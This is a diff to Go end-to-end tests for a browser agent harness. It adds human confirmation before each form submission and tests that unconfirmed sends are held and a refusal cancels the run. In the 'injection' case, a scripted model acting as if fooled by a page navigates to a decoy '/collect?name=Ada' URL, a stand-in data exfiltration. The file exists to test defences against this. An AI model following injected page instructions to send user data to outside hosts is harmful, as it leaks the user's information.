@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -276,6 +277,20 @@ func refIn(t *testing.T, results []string, label string) string {
 	return "e0"
 }
 
+// confirm is a move that asks a person before the click that sends
+// (roadmap 9.7).
+func confirm(summary string) move {
+	return func([]string) string {
+		b, _ := json.Marshal(map[string]string{"summary": summary})
+		return fmt.Sprintf(`{"type":"tool_use","id":"c%d","name":"confirm","input":%s}`, time.Now().UnixNano(), b)
+	}
+}
+
+// yes is a person who sends every form they're asked about, counting them.
+func yes(asked *int) func(context.Context, pirn.ActPending) (bool, error) {
+	return func(context.Context, pirn.ActPending) (bool, error) { *asked++; return true, nil }
+}
+
 // say is a move that ends with text.
 func say(text string) move {
 	return func([]string) string { b, _ := json.Marshal(text); return `{"type":"text","text":` + string(b) + `}` }
@@ -307,24 +322,24 @@ func standInScripts(t *testing.T) map[string][]move {
 		"contact": {open(t, "contact"), snapshot(t),
 			// A wrong email first: the form comes back saying so.
 			fill(t, tb("Full name", "Ada Lovelace"), tb("Email", "ada at example.org"), tb("Phone", "020 7946 0018"), tb("Message", "Please call me back.")),
-			click(t, `button "Send"`), snapshot(t),
+			confirm("Ada Lovelace, ada at example.org."), click(t, `button "Send"`), snapshot(t),
 			fill(t, tb("Full name", "Ada Lovelace"), tb("Email", "ada@example.org"), tb("Phone", "020 7946 0018"), tb("Message", "Please call me back.")),
-			click(t, `button "Send"`), say("Sent the contact form for Ada Lovelace.\nResult: finished")},
+			confirm("Ada Lovelace, ada@example.org."), click(t, `button "Send"`), say("Sent the contact form for Ada Lovelace.\nResult: finished")},
 		"conditional": {open(t, "conditional"), snapshot(t), fill(t, tb("Your name", "Ada Lovelace"), field("radio", "Yes", "true")), snapshot(t),
-			fill(t, tb("Car registration", "AB12 CDE")), click(t, `button "Book"`), say("Booked, with parking for AB12 CDE.\nResult: finished")},
+			fill(t, tb("Car registration", "AB12 CDE")), confirm("Parking for AB12 CDE."), click(t, `button "Book"`), say("Booked, with parking for AB12 CDE.\nResult: finished")},
 		"widgets": {open(t, "widgets"), snapshot(t),
 			fill(t, tb("Delivery date", "2026-12-12"), field("radio", "Medium", "true"), field("checkbox", "Gift wrap", "true"),
 				field("checkbox", "Send me the newsletter", "false"), field("combobox", "Country", "Portugal")), snapshot(t),
-			fill(t, field("combobox", "City", "Lisbon"), field("checkbox", "I accept the terms", "true")), click(t, `button "Order"`),
+			fill(t, field("combobox", "City", "Lisbon"), field("checkbox", "I accept the terms", "true")), confirm("A medium tea towel to Lisbon."), click(t, `button "Order"`),
 			say("Ordered a medium tea towel for 12 December to Lisbon, gift wrapped.\nResult: finished")},
 		"iframe": {open(t, "iframe"), snapshot(t), fill(t, tb("Email", "ada@example.org"), field("combobox", "How often", "Weekly")),
-			click(t, `button "Subscribe"`), say("Subscribed ada@example.org weekly.\nResult: finished")},
+			confirm("ada@example.org, weekly."), click(t, `button "Subscribe"`), say("Subscribed ada@example.org weekly.\nResult: finished")},
 		"wizard": {open(t, "wizard"), snapshot(t), fill(t, tb("Name", "Ada Lovelace"), tb("Email", "ada@example.org")), click(t, `button "Next"`), snapshot(t),
 			fill(t, field("combobox", "Day", "Saturday"), field("combobox", "Lunch", "Vegetarian")), click(t, `button "Back"`), snapshot(t),
-			click(t, `button "Next"`), snapshot(t), click(t, `button "Next"`), snapshot(t), click(t, `button "Register"`),
+			click(t, `button "Next"`), snapshot(t), click(t, `button "Next"`), snapshot(t), confirm("Ada Lovelace, Saturday, vegetarian."), click(t, `button "Register"`),
 			say("Registered Ada Lovelace for Saturday, vegetarian lunch.\nResult: finished")},
 		"injection": {open(t, "injection"), snapshot(t), fill(t, tb("Feedback", "Great workshop, thank you."), map[string]any{"name": "Rating", "type": "textbox", "target": `ref:spinbutton "Rating (1 to 5)"`, "value": "5"}),
-			click(t, `button "Send feedback"`),
+			confirm("Great workshop, 5."), click(t, `button "Send feedback"`),
 			// What the page asks for, as a fooled model would try it.
 			tool(t, "browser_navigate", map[string]any{"url": "http://decoy-srv:8080/collect?name=Ada"}),
 			say("Sent the feedback.\nResult: finished")},
@@ -356,8 +371,9 @@ func TestE2ECourse_StandIn(t *testing.T) {
 	for _, name := range c.names() {
 		t.Run(name, func(t *testing.T) {
 			claude := scripted(t, scripts[name]...)
+			asked := 0
 			act := pirn.Act{Claude: pirn.Claude{APIKey: "stand-in", BaseURL: claude.URL},
-				Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: c.network}}, Image: img}
+				Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: c.network}}, Image: img, Confirm: yes(&asked)}
 			rec := runAct(t, act, c.program(name))
 			got := c.check(name)
 			switch {
@@ -374,8 +390,14 @@ func TestE2ECourse_StandIn(t *testing.T) {
 			case !got.Done || rec.Ended != pirn.EndedFinished:
 				t.Errorf("not done: received %v, ended %s, calls %+v", got.Received, rec.Ended, rec.Calls)
 			}
-			if name == "contact" && len(rec.Calls) < 7 {
+			if name == "contact" && len(rec.Calls) < 9 {
 				t.Errorf("the wrong email wasn't tried first: %d calls", len(rec.Calls))
+			}
+			// Every send asked a person first; the password form never got
+			// that far (roadmap 9.7).
+			want := map[string]int{"contact": 2, "password": 0}
+			if n, ok := want[name]; !ok && asked != 1 || ok && asked != n {
+				t.Errorf("asked %d times", asked)
 			}
 		})
 	}
@@ -398,6 +420,49 @@ func TestE2ECourse_StandIn(t *testing.T) {
 		}
 		if strings.Join(refused, " ") != "browser_type browser_press_key browser_press_key" || strings.Contains(string(must(json.Marshal(rec))), "hunter2") {
 			t.Errorf("refused %v of %+v", refused, rec.Calls)
+		}
+	})
+	// Roadmap 9.7: nothing submits a form without a confirmation. An agent
+	// that skips confirm has its sends held, and one a person says no to
+	// ends there; the form's server receives nothing more. Only a program
+	// that says :send-without-asking sends unasked.
+	tb := func(label, v string) map[string]any { return field("textbox", label, v) }
+	contact := func() move {
+		return fill(t, tb("Full name", "Ada Lovelace"), tb("Email", "ada@example.org"), tb("Phone", "020 7946 0018"), tb("Message", "Please call me back."))
+	}
+	t.Run("skips-confirm", func(t *testing.T) {
+		before := len(c.check("contact").Received)
+		claude := scripted(t, open(t, "contact"), snapshot(t), contact(), click(t, `button "Send"`), snapshot(t),
+			tool(t, "browser_press_key", map[string]any{"key": "Enter"}), say("Sent.\nResult: finished"))
+		asked := 0
+		act := pirn.Act{Claude: pirn.Claude{APIKey: "stand-in", BaseURL: claude.URL},
+			Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: c.network}}, Image: img, Confirm: yes(&asked)}
+		rec := runAct(t, act, c.program("contact"))
+		if got := c.check("contact"); len(got.Received) != before || rec.HeldTotal == 0 || asked != 0 {
+			t.Errorf("sent without asking: received %v, held %d, asked %d", got.Received, rec.HeldTotal, asked)
+		}
+	})
+	t.Run("person-says-no", func(t *testing.T) {
+		before := len(c.check("contact").Received)
+		claude := scripted(t, open(t, "contact"), snapshot(t), contact(), confirm("Ada Lovelace, ada@example.org."), click(t, `button "Send"`), say("Sent.\nResult: finished"))
+		act := pirn.Act{Claude: pirn.Claude{APIKey: "stand-in", BaseURL: claude.URL},
+			Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: c.network}}, Image: img,
+			Confirm: func(context.Context, pirn.ActPending) (bool, error) { return false, nil }}
+		rec := runAct(t, act, c.program("contact"))
+		if got := c.check("contact"); len(got.Received) != before || rec.Ended != pirn.EndedCancelled {
+			t.Errorf("sent after a no: received %v, ended %s", got.Received, rec.Ended)
+		}
+	})
+	t.Run("send-without-asking", func(t *testing.T) {
+		before := len(c.check("contact").Received)
+		claude := scripted(t, open(t, "contact"), snapshot(t), contact(), click(t, `button "Send"`), say("Sent.\nResult: finished"))
+		asked := 0
+		act := pirn.Act{Claude: pirn.Claude{APIKey: "stand-in", BaseURL: claude.URL},
+			Browser: pirn.ReedBrowser{Browser: reed.Browser{Image: img, Network: c.network}}, Image: img, Confirm: yes(&asked)}
+		program := fmt.Sprintf("(act %q %q :send-without-asking)", c.forms["contact"].Task, "http://forms-srv:8080/contact/")
+		rec := runAct(t, act, program)
+		if got := c.check("contact"); len(got.Received) != before+1 || !rec.SendFreely || asked != 0 || rec.HeldTotal != 0 {
+			t.Errorf("an opted-out step: received %v, sendWithoutAsking %v, asked %d, held %d", got.Received, rec.SendFreely, asked, rec.HeldTotal)
 		}
 	})
 	time.Sleep(time.Second)
